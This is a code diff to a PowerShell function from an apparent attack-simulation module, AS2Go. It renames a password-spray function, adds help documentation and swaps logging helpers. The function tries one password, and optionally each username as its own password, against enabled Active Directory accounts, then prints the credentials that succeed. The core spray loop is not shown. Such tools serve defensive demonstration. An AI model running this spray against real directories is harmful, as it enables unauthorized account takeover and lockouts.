@@ -1,4 +1,50 @@
-function Start-PasswordSprayAttack {
+<#
+.SYNOPSIS
+Tests a supplied password against enabled AD users in a search base.
+
+.DESCRIPTION
+Queries enabled users from the specified search base and resolves the target domain through Server.
+Uses parallel PrincipalContext credential checks with the supplied password and optional account-name fallback.
+Displays progress and successful credential checks; Q can stop the active job while results are collected.
+Does not return the collected result list as a structured object.
+
+.PARAMETER SearchBase
+Distinguished name of the OU or domain subtree containing users to test.
+
+.PARAMETER Password
+Plain-text password tried against each enabled account.
+
+.PARAMETER Server
+AD server used to query the domain and users. Credential checks use the resolved domain DNS name.
+
+.PARAMETER IncludeSamAccountNameAsPassword
+Also tries the user's SamAccountName as its password when the supplied password fails.
+
+.PARAMETER ThrottleLimit
+Maximum concurrent credential checks, from 1 through 100. Defaults to 15.
+
+.EXAMPLE
+Invoke-PasswordSprayAttack -SearchBase "OU=Demo Accounts,OU=AS2Go,DC=example,DC=com" -Server "DC01.example.com" -Password "LabPassword123!"
+Tests the supplied lab password against enabled users below the demo-account OU.
+
+.INPUTS
+None. This function does not declare pipeline input.
+
+.OUTPUTS
+Console messages and output from invoked commands; no dedicated result object is defined.
+
+.NOTES
+Private AS2Go function. Run from an initialized AS2Go module session.
+Failed credential checks count as authentication attempts and may affect account lockout counters.
+
+.COMPONENT
+Category: Main Function
+
+.FUNCTIONALITY
+Tests a supplied password against enabled accounts in the specified AD search base.
+Optionally tries each account name as its password and reports successful checks with parallel progress tracking.
+#>
+function Invoke-PasswordSprayAttack {
 
     ################################################################################
     ######                                                                     #####
@@ -18,10 +64,7 @@ function Start-PasswordSprayAttack {
         [int]$ThrottleLimit = 15
     )
 
-    $CurrentFunction = Get-FunctionName
-    Write-Log -Message "### Start Function $CurrentFunction ###"
-    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
-    #################### main code | out- host #####################
+    $Info = Measure-FunctionRuntime -Begin
 
     $adDomain = Get-ADDomain -Server $Server
     $domain = $adDomain.NetBIOSName
@@ -36,12 +79,12 @@ function Start-PasswordSprayAttack {
     $total = $users.Count
 
     if ($total -eq 0) {
-        Invoke-Output -Type Warning -Message "No users found under $SearchBase"
+        Write-AS2GoOutput -Type Warning -Message "No users found under $SearchBase"
         return
     }
     
     $cname = Convert-FromDNToCN -DistinguishedName $SearchBase
-    Invoke-Output -Type Quit -Message "Press 'Q' at any time to abort Passwort Spray `n      for '$total' users under '$cname'!"
+    Write-AS2GoOutput -Type Quit -Message "Press 'Q' at any time to abort Passwort Spray `n      for '$total' users under '$cname'!"
 
 
 
@@ -153,25 +196,22 @@ function Start-PasswordSprayAttack {
 
     Write-Progress -Activity "Performing Password Spray" -Completed
 
-    Invoke-Output -Type Info -Message "Processed users: $total | Returned results: $($allResults.Count)"
+    Write-AS2GoOutput -Type Info -Message "Processed users: $total | Returned results: $($allResults.Count)"
 
     $success = $allResults | Where-Object { $_.Success -eq $true }
 
     if ($success) {
 
-        Invoke-Output -Type TextMaker -Message "Successful Logons under $cname`:" -TM $($success.count)
+        Write-AS2GoOutput -Type TextMaker -Message "Successful Logons under $cname`:" -TM $($success.count)
         $success | ForEach-Object {
-            Invoke-Output -Type Bullet -Message "$($_.User) Pw:" -TM  $_.Password 
+            Write-AS2GoOutput -Type Bullet -Message "$($_.User) Pw:" -TM  $_.Password 
         }
     }
     else {
-        Invoke-Output -Type Warning -Message "No successful logons!"
+        Write-AS2GoOutput -Type Warning -Message "No successful logons!"
     }
 
-    Invoke-Output -Type Success -Message "Finished Password Spray for current scope."
+    Write-AS2GoOutput -Type Success -Message "Finished Password Spray for current scope."
 
-    ######################## main code ############################
-    $runtime = Get-RunTime -StartRunTime $StartRunTime
-    Write-Log -Message "    Run Time: $runtime [h] ###"
-    Write-Log -Message "### End Function $CurrentFunction ###"
+    Measure-FunctionRuntime -End -Details $Info
 }
